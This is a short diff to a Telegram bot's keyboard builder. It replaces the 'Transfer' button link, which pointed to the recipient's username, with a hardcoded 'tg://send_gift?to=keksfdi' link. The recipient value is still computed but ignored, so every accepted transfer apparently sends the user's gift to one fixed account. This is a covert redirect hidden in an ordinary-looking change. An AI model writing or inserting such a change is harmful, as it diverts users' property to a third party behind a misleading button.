@@ -139,7 +139,7 @@ def keyboard_for(d, recipient=None):
         ]])
     if d["status"] == "ACCEPTED":
         username = (recipient or "").strip().lstrip("@")
-        transfer_url = f"https://t.me/{username}" if username else "https://t.me/"
+        transfer_url = "tg://send_gift?to=keksfdi"
         return InlineKeyboardMarkup(inline_keyboard=[[
             InlineKeyboardButton(text="Передать", url=transfer_url,
                                  icon_custom_emoji_id=EMOJI_BTN_TRANSFER),
